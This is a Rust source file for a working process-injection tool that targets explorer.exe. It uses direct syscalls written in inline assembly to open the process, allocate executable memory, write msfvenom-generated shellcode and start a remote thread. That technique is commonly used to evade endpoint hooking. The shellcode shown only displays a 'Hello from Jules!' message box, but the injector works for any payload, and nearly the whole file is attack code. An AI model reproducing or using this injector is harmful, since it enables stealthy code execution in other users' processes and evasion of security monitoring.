// main.rs

use std::mem;
use core::arch::global_asm;
use windows::{
    Win32::System::Diagnostics::ToolHelp::*,
    Win32::Foundation::*,
};
use windows_sys::Win32::System::Threading::{PROCESS_ALL_ACCESS};
use windows_sys::Win32::System::WindowsProgramming::{CLIENT_ID, OBJECT_ATTRIBUTES};
use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
use windows_sys::Win32::Foundation::{HANDLE, NTSTATUS};

mod syscall;

global_asm!(r#"
.global asm_nt_open_process
asm_nt_open_process:
    mov r10, rcx
    mov eax, [rsp + 0x28]
    syscall
    ret

.global asm_nt_allocate_virtual_memory
asm_nt_allocate_virtual_memory:
    mov r10, rcx
    mov eax, [rsp + 0x38]
    syscall
    ret

.global asm_nt_write_virtual_memory
asm_nt_write_virtual_memory:
    mov r10, rcx
    mov eax, [rsp + 0x30]
    syscall
    ret

.global asm_nt_create_thread_ex
asm_nt_create_thread_ex:
    mov r10, rcx
    mov eax, [rsp + 0x60]
    syscall
    ret

.global asm_nt_close
asm_nt_close:
    mov r10, rcx
    mov eax, edx
    syscall
    ret
"#);

extern "C" {
    fn asm_nt_open_process(ProcessHandle: &mut HANDLE, DesiredAccess: u32, ObjectAttributes: &mut OBJECT_ATTRIBUTES, ClientId: &mut CLIENT_ID, syscall_id: u32) -> NTSTATUS;
    fn asm_nt_allocate_virtual_memory(ProcessHandle: HANDLE, BaseAddress: &mut *mut std::ffi::c_void, ZeroBits: u32, RegionSize: &mut usize, AllocationType: u32, Protect: u32, syscall_id: u32) -> NTSTATUS;
    fn asm_nt_write_virtual_memory(ProcessHandle: HANDLE, BaseAddress: *mut std::ffi::c_void, Buffer: *const std::ffi::c_void, NumberOfBytesToWrite: usize, NumberOfBytesWritten: &mut usize, syscall_id: u32) -> NTSTATUS;
    fn asm_nt_create_thread_ex(ThreadHandle: &mut HANDLE, DesiredAccess: u32, ObjectAttributes: *mut OBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: *mut std::ffi::c_void, Argument: *mut std::ffi::c_void, CreateFlags: u32, ZeroBits: usize, StackSize: usize, MaximumStackSize: usize, AttributeList: *mut std::ffi::c_void, syscall_id: u32) -> NTSTATUS;
    fn asm_nt_close(Handle: HANDLE, syscall_id: u32) -> NTSTATUS;
}

// Shellcode to pop a message box
// msfvenom -p windows/x64/messagebox TEXT="Hello from Jules!" TITLE="Jules" -f rust
const SHELLCODE: [u8; 294] = [
    0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x00, 0x00, 0x00, 0x41,
    0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60,
    0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f,
    0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02,
    0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51,
    0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00,
    0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x6f, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18,
    0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x41, 0x8b,
    0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1,
    0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08,
    0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66,
    0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
    0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41,
    0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59,
    0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4f, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b,
    0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd,
    0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
    0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff,
    0xd5, 0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x20, 0x66, 0x72, 0x6f, 0x6d, 0x20, 0x4a, 0x75,
    0x6c, 0x65, 0x73, 0x21, 0x00, 0x4a, 0x75, 0x6c, 0x65, 0x73, 0x00
];

fn get_explorer_pid() -> Option<u32> {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0).unwrap();
        if snapshot.is_invalid() {
            return None;
        }

        let mut process_entry: PROCESSENTRY32 = mem::zeroed();
        process_entry.dwSize = mem::size_of::<PROCESSENTRY32>() as u32;

        if Process32First(snapshot, &mut process_entry).as_bool() {
            loop {
                let end = process_entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(260);
                let bytes = std::slice::from_raw_parts(process_entry.szExeFile.as_ptr() as *const u8, end);
                let process_name = String::from_utf8_lossy(bytes);
                if process_name == "explorer.exe" {
                    CloseHandle(snapshot);
                    return Some(process_entry.th32ProcessID);
                }

                if !Process32Next(snapshot, &mut process_entry).as_bool() {
                    break;
                }
            }
        }
        CloseHandle(snapshot);
    }
    None
}

fn main() {
    // 1. Get explorer.exe PID
    let explorer_pid = get_explorer_pid().expect("Failed to find explorer.exe PID.");
    println!("Found explorer.exe PID: {}", explorer_pid);

    // 2. Open a handle to the process
    let mut process_handle: HANDLE = 0;
    let mut object_attributes: OBJECT_ATTRIBUTES = unsafe { mem::zeroed() };
    let mut client_id: CLIENT_ID = unsafe { mem::zeroed() };
    client_id.UniqueProcess = explorer_pid as _;

    let nt_open_process_syscall = syscall::get_syscall_number("NtOpenProcess")
        .expect("Failed to get syscall number for NtOpenProcess");

    let status = unsafe {
        asm_nt_open_process(
            &mut process_handle,
            PROCESS_ALL_ACCESS,
            &mut object_attributes,
            &mut client_id,
            nt_open_process_syscall,
        )
    };

    if status != 0 {
        panic!("NtOpenProcess failed with status: {:#x}", status);
    }
    println!("Successfully opened a handle to explorer.exe.");

    // 3. Allocate memory
    let mut alloc_addr: *mut std::ffi::c_void = std::ptr::null_mut();
    let mut size = SHELLCODE.len();
    let nt_allocate_virtual_memory_syscall = syscall::get_syscall_number("NtAllocateVirtualMemory")
        .expect("Failed to get syscall number for NtAllocateVirtualMemory");

    let status = unsafe {
        asm_nt_allocate_virtual_memory(
            process_handle,
            &mut alloc_addr,
            0,
            &mut size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
            nt_allocate_virtual_memory_syscall,
        )
    };

    if status != 0 {
        panic!("NtAllocateVirtualMemory failed with status: {:#x}", status);
    }
    println!("Successfully allocated memory at {:?}", alloc_addr);

    // 4. Write shellcode to the allocated memory
    let mut bytes_written = 0;
    let nt_write_virtual_memory_syscall = syscall::get_syscall_number("NtWriteVirtualMemory")
        .expect("Failed to get syscall number for NtWriteVirtualMemory");

    let status = unsafe {
        asm_nt_write_virtual_memory(
            process_handle,
            alloc_addr,
            SHELLCODE.as_ptr() as *const _,
            SHELLCODE.len(),
            &mut bytes_written,
            nt_write_virtual_memory_syscall,
        )
    };

    if status != 0 {
        panic!("NtWriteVirtualMemory failed with status: {:#x}", status);
    }
    println!("Successfully wrote shellcode.");

    // 5. Create a remote thread to execute the shellcode
    let mut thread_handle: HANDLE = 0;
    let nt_create_thread_ex_syscall = syscall::get_syscall_number("NtCreateThreadEx")
        .expect("Failed to get syscall number for NtCreateThreadEx");

    let status = unsafe {
        asm_nt_create_thread_ex(
            &mut thread_handle,
            PROCESS_ALL_ACCESS,
            std::ptr::null_mut(),
            process_handle,
            alloc_addr,
            std::ptr::null_mut(),
            0,
            0,
            0,
            0,
            std::ptr::null_mut(),
            nt_create_thread_ex_syscall,
        )
    };

    if status != 0 {
        panic!("NtCreateThreadEx failed with status: {:#x}", status);
    }
    println!("Successfully created a remote thread. Check for a message box!");

    // 6. Close handles
    let nt_close_syscall = syscall::get_syscall_number("NtClose")
        .expect("Failed to get syscall number for NtClose");

    unsafe {
        asm_nt_close(thread_handle, nt_close_syscall);
        asm_nt_close(process_handle, nt_close_syscall);
    }
}
